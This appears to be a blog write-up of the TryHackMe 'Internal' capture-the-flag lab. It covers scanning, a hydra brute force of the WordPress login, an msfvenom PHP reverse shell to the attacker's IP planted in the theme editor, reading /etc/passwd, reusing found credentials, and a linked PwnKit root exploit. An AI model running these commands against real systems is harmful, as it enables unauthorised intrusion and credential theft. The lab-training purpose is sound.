<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="TryHackMe Internal" />
<meta property="og:locale" content="en" />
<meta name="description" content="Solutions to CTFs and articles regarding cybersecurity." />
<meta property="og:description" content="Solutions to CTFs and articles regarding cybersecurity." />
<link rel="canonical" href="https://jason-kenyon.com/posts/internal/" />
<meta property="og:url" content="https://jason-kenyon.com/posts/internal/" />
<meta property="og:site_name" content="Jason’s Page" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-01-08T00:00:00-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="TryHackMe Internal" />
<meta name="twitter:site" content="@" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-01-08T00:00:00-05:00","datePublished":"2025-01-08T00:00:00-05:00","description":"Solutions to CTFs and articles regarding cybersecurity.","headline":"TryHackMe Internal","mainEntityOfPage":{"@type":"WebPage","@id":"https://jason-kenyon.com/posts/internal/"},"url":"https://jason-kenyon.com/posts/internal/"}</script>
<!-- End Jekyll SEO tag -->


  <title>TryHackMe Internal | Jason's Page
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Jason's Page">
<meta name="application-name" content="Jason's Page">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="/assets/lib/fonts/main.css">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="/assets/lib/fontawesome-free/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="/assets/lib/tocbot/tocbot.min.css">
  

  
    <link rel="stylesheet" href="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="/assets/lib/glightbox/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    <script defer src="/assets/lib/simple-jekyll-search/simple-jekyll-search.min.js"></script>
  

  
    <script defer src="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.umd.min.js"></script>
  

  
    <script defer src="/assets/lib/glightbox/glightbox.min.js"></script>
  

  
    <script defer src="/assets/lib/clipboard/clipboard.min.js"></script>
  

  
    <script defer src="/assets/lib/dayjs/dayjs.min.js"></script>
  

  
    <script defer src="/assets/lib/dayjs/locale/en.js"></script>
  

  
    <script defer src="/assets/lib/dayjs/plugin/relativeTime.js"></script>
  

  
    <script defer src="/assets/lib/dayjs/plugin/localizedFormat.js"></script>
  









<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/me.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">Jason's Page</a>
    <p class="site-subtitle fst-italic mb-0">CTFs and Articles</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
    
    <a href="mailto: jas0nkenyon@protonmail.com" class="fa fa-envelope"></a>
    <a href="https://www.linkedin.com/in/jason-kenyon-8b063133b/" class="fa-brands fa-linkedin"></a>
    <a href="https://github.com/jas0nkenyon" class="fa-brands fa-github"></a>
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>TryHackMe Internal</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  

  
  

  

  
  

  




<!-- return -->










<article class="px-1" data-toc="false">
  <header>
    <h1 data-toc-skip>TryHackMe Internal</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1736312400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jan  8, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://github.com/jas0nkenyon# change to your GitHub homepage">Jason Kenyon</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1060 words"
>
  <em>5 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  

  <div class="content">
    <p><a href="/assets/img/internal/internal.jpeg" class="popup img-link  shimmer"><img src="/assets/img/internal/internal.jpeg" alt="" loading="lazy"></a></p>

<h1 id="information-gathering">Information Gathering</h1>
<p>We are briefed:</p>

<blockquote>
  <p>You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks.</p>

  <p>Scope of Work</p>

  <p>The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:</p>

  <p>User.txt
Root.txt
Additionally, the client has provided the following scope allowances:</p>

  <p>Ensure that you modify your hosts file to reflect internal.thm
Any tools or techniques are permitted in this engagement
Locate and note all vulnerabilities found
Submit the flags discovered to the dashboard
Only the IP address assigned to your machine is in scope
(Roleplay off)</p>

  <p>I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.</p>

  <p>Note - this room can be completed without Metasploit</p>

  <p><strong>Writeups will not be accepted for this room.</strong></p>
</blockquote>

<p>The target IP address is <code class="language-plaintext highlighter-rouge">10.10.179.181</code>.</p>

<p>Our objectives are to:</p>

<ol>
  <li>locate and obtain the <code class="language-plaintext highlighter-rouge">User.txt</code> file,</li>
  <li>locate and obtain the <code class="language-plaintext highlighter-rouge">Root.txt</code> file,</li>
  <li>document all vulnerabilities found, and</li>
  <li>provide remediation suggestions.</li>
</ol>

<h1 id="enumeration">Enumeration</h1>
<p>We begin with the nmap scan <code class="language-plaintext highlighter-rouge">nmap -T5 -A -O 10.10.179.181</code>, which reveals</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre>Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-08 08:15 EST
Nmap scan report for 10.10.179.181
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   32.75 ms  10.6.0.1
2   ... 3
4   102.60 ms 10.10.179.181

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.31 seconds
</pre></td></tr></tbody></table></code></div></div>
<p>Immediately, we notice the default page for an Apache web server.</p>

<p>We then fuzz for directories using the command <code class="language-plaintext highlighter-rouge">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.179.181/FUZZ -ic</code>. This outputs</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>...
wordpress               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 97ms]
blog                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 4360ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 4383ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 97ms]
phpmyadmin              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 96ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 97ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 97ms
...
</pre></td></tr></tbody></table></code></div></div>

<p>We notice that some of the functionality use by the web application uses the domain name <code class="language-plaintext highlighter-rouge">internal.thm</code> to refer to the target,
so we add the entry <code class="language-plaintext highlighter-rouge">10.10.179.181 internal.thm</code> to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>

<p>Our initial observation is that
the wordpress login provides different output when a failed authentication attempt is made with a valid username than it does
when an invalid username is used, simplifying authentication bypass. Moreover, the <code class="language-plaintext highlighter-rouge">phpmyadmin</code> portal is accessible to the outside world. This is completely unnecessary and poses significant security risks.</p>

<p>Upon navigating to the endpoint <code class="language-plaintext highlighter-rouge">http://internal.thm/wordpress/</code> and clicking on the <code class="language-plaintext highlighter-rouge">Entries Feed</code> tab, we automatically
download a file named <code class="language-plaintext highlighter-rouge">n-T86yJG</code> containing XML data to be used by RSS readers.</p>

<p><a href="/assets/img/internal/wordpresslink.png" class="popup img-link  shimmer"><img src="/assets/img/internal/wordpresslink.png" alt="" loading="lazy"></a></p>

<p>This file contains the line
<code class="language-plaintext highlighter-rouge">&lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;</code>, which indicates that the web server is using wordpress version
5.4.2. This is an information disclosure vulnerability, but it may be necessary for RSS to function properly in this case.</p>

<p>We also note that users can post comments anonymously, which makes this page vulnerable to injection attacks such as XSS.</p>

<h1 id="exploitation">Exploitation</h1>
<p>We opt to perform a brute force attack on the wordpress login form with the command</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>hydra 10.10.179.181 -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/blog/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&amp;testcookie=1:F=Lost your password?"
</pre></td></tr></tbody></table></code></div></div>

<p>We quickly find the password is <code class="language-plaintext highlighter-rouge">my2boys</code> and login. Afterward, we generate a php reverse shell using the command
<code class="language-plaintext highlighter-rouge">msfvenom -p php/reverse_php LHOST=10.6.4.176 LPORT=6969 -o shell.php</code>, navigate to the theme editor, and copy the contents
of <code class="language-plaintext highlighter-rouge">shell.php</code> into the active theme’s <code class="language-plaintext highlighter-rouge">index.php</code> file.</p>

<p><a href="/assets/img/internal/theme.png" class="popup img-link  shimmer"><img src="/assets/img/internal/theme.png" alt="" loading="lazy"></a></p>

<p>Then, we set up a netcat listener with <code class="language-plaintext highlighter-rouge">nc -lvnp 6969</code> and navigate to <code class="language-plaintext highlighter-rouge">http://internal.thm/blog/</code>. 
Consequently, we receive a shell as <code class="language-plaintext highlighter-rouge">www-data</code>.</p>

<h1 id="post-exploitation">Post-Exploitation</h1>
<p>To identify the local users on the system we exectute <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code> and receive</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
</pre></td></tr></tbody></table></code></div></div>

<p>In attempt to locate the user flag, we run <code class="language-plaintext highlighter-rouge">find / -type f -iname 'user.txt' 2&gt;/dev/null</code>, but find the file 
<code class="language-plaintext highlighter-rouge">/usr/share/doc/phpmyadmin/html/_sources/user.txt</code>, which is not a flag. Likely, we need a user with different read permissions
than <code class="language-plaintext highlighter-rouge">www-data</code>.</p>

<p>While performing some manual enumeration, we list the contents of the <code class="language-plaintext highlighter-rouge">/opt</code> directory and find the file <code class="language-plaintext highlighter-rouge">wp-save.txt</code>. The
contents of this file are as follows:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:&lt;DOITURSELF:)&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>With <code class="language-plaintext highlighter-rouge">ssh aubreanna@10.10.179.181</code>, we are able to successfully authenticate with the aforementioned password. This allows
us to capture the user flag:</p>

<p><a href="/assets/img/internal/user.txt.png" class="popup img-link  shimmer"><img src="/assets/img/internal/user.txt.png" alt="" loading="lazy"></a></p>

<p>Running <code class="language-plaintext highlighter-rouge">find / -type f -iname 'root.txt' 2&gt;/dev/null</code> gives us no results, so we will have to elevate privileges even 
further to obtain the root flag.</p>

<p>Running linpeas on the machine indicates that it is vulnerable to CVE-2021-4034. We use the exploit at <a href="https://github.com/ly4k/PwnKit">https://github.com/ly4k/PwnKit</a>
and gain root. As root, we rerun the previous <code class="language-plaintext highlighter-rouge">find</code> command and locate the root flag <code class="language-plaintext highlighter-rouge">/home/root/root.txt</code>.</p>

<p><a href="/assets/img/internal/root.txt.png" class="popup img-link  shimmer"><img src="/assets/img/internal/root.txt.png" alt="" loading="lazy"></a></p>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/ctfs/">CTFs</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/tryhackme/"
            class="post-tag no-text-decoration"
          >tryhackme</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Internal%20-%20Jason's%20Page&url=https%3A%2F%2Fjason-kenyon.com%2Fposts%2Finternal%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=TryHackMe%20Internal%20-%20Jason's%20Page&u=https%3A%2F%2Fjason-kenyon.com%2Fposts%2Finternal%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=https%3A%2F%2Fjason-kenyon.com%2Fposts%2Finternal%2F&text=TryHackMe%20Internal%20-%20Jason's%20Page" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/internal/">TryHackMe Internal</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/relevant/">TryHackMe Relevant</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/skynet/">TryHackMe Skynet</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/daily_bugle/">TryHackMe Daily Bugle</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/tryhackme/">tryhackme</a>
      
    </div>
  </section>


            </div>

            
              
              







            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    










  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/relevant/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1736226000"
  data-df="ll"
  
>
  Jan  7, 2025
</time>

              <h4 class="pt-0 my-2">TryHackMe Relevant</h4>
              <div class="text-muted">
                <p>Information Gathering
We are given the following


  You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days.

  ...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/daily_bugle/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1735880400"
  data-df="ll"
  
>
  Jan  3, 2025
</time>

              <h4 class="pt-0 my-2">TryHackMe Daily Bugle</h4>
              <div class="text-muted">
                <p>Information Gathering
We are instructed as follows:


  Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.


And we are give...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/skynet/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1735534800"
  data-df="ll"
  
>
  Dec 30, 2024
</time>

              <h4 class="pt-0 my-2">TryHackMe Skynet</h4>
              <div class="text-muted">
                <p>Information Gathering

We are given:


  Deploy and compromise the vulnerable machine!


Additonally, we are given the target IP 10.10.13.83. Our objectives are as follows:


  Obtain Miles’ email ...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/relevant/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>TryHackMe Relevant</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://github.com/jas0nkenyon# change to your GitHub homepage">Jason Kenyon</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.2.4"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
